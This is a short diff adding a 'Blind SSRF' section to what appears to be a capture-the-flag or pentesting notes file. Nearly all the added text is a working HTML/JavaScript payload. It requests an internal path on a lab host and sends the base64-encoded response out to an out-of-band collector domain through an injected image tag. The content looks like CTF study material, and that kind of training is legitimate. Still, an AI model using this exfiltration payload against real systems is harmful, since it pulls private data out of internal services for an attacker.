@@ -106,3 +106,20 @@ ngrok http http://localhost:8080
 
 ## Blind SSRF
 
+```html
+<script>
+    // Create a new XMLHttpRequest object
+    exfil = new XMLHttpRequest();
+
+    // Set the target server below (e.g., https://abcdefg.ctfio.com)
+    exfil.open("GET", "https://burgundy.ctfio.com/blind/recipe");
+    exfil.send();
+
+    // Set your Colab instance URL below to capture the contents of /blind/recipe
+    exfil.onload = function() { 
+        document.write('<img src="puuatcmlkisigmqtcmzzjtswfv8t67vdw.oast.fun/?x=' + 
+        btoa(this.responseText) + '">'); 
+    }
+</script>
+```
+
